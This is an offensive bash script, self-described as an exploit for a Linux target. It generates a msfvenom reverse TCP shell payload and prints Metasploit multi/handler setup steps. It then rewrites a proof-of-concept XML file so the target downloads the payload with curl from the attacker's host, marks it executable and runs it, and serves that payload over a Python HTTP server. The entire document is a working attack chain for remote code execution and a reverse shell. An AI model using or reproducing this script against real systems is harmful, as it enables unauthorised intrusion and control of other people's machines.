#!/usr/bin/env bash
# Exploit script for linux target

TARGET=$1
LISTENER_IP=$2
LISTENER_PORT=$3
PYTHON_SERVER_PORT=8081

if [[ $# -ne 3 ]]; then
  echo "Usage $0 TARGET LISTENER_IP LISTENER_PORT"
  exit 1
fi

# Create MSF Venom Payload
if msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LISTENER_IP} LPORT=${LISTENER_PORT} -f elf -o shell.elf >/dev/null 2>&1; then
  printf ">[i] shellcode saved to shell.elf\n"
else
  printf ">[i] msfvenom failed to generate shellcode. Manually create is using:\n \tmsfvenom -p linux/x64/shell_reverse_tcp LHOST=${LISTENER_IP} LPORT=${LISTENER_PORT} -f elf -o shell.elf \n"
fi

# Output instructions for MSFVenom
printf ">[i] set up multi handler with msfconsole\n"
printf "\tuse exploit/multi/handler\n"
printf "\tset payload linux/x64/shell_reverse_tcp\n"

# Update the POC exploit
sed -i "s|<value>curl.*|<value>curl -s -o shell.elf http://${LISTENER_IP}:${PYTHON_SERVER_PORT}/shell.elf\; chmod +x ./shell.elf; ./shell.elf</value>|" poc-linux.xml

# Serve the POC file
printf ">[i] Serving payload file at ${LISTENER_IP}:${LISTENER_PORT}\n"
python3 -m http.server ${PYTHON_SERVER_PORT}
